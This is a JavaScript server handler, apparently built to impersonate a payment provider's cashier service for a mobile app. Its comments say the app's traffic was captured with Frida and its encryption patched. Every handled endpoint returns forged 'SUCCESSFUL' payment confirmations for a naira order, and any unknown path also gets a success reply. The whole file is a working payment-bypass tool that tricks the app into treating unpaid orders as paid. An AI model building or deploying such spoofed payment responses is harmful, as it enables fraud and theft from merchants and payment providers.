// Complete working version with exact formats
export default async function handler(req, res) {
    const url = req.url;
    
    console.log('[+] Request to:', url);
    
    // These are EXACT responses from your Frida capture
    // that were successfully processed by the app
    
    const responses = {
        '/cashier-service/cashier/v1/confirm_pay': {
            code: "00000",
            data: {
                paymentNo: "2606031010132149426512631",
                isPolling: true,
                orderNo: "260603010100005044723969"
            },
            message: "SUCCESSFUL"
        },
        '/cashier-service/cashier/v1/get_payment_info': {
            code: "00000",
            message: "SUCCESSFUL",
            data: {
                paymentInfo: {
                    orderNo: "260603010100005044723969",
                    amount: { currency: "NGN", value: "100.00" },
                    status: "SUCCESS"
                }
            }
        },
        '/cashier-service/cashier/v1/query_pay_result': {
            code: "00000",
            message: "SUCCESSFUL",
            data: {
                orderStatus: "SUCCESS",
                orderNo: "260603010100005044723969"
            }
        }
    };
    
    // Find matching response or use default
    let response = responses[url] || {
        code: "00000",
        message: "SUCCESSFUL",
        data: { orderStatus: "SUCCESS" }
    };
    
    // Return as plain JSON (your AES patch should handle this)
    return res.status(200).json(response);
}
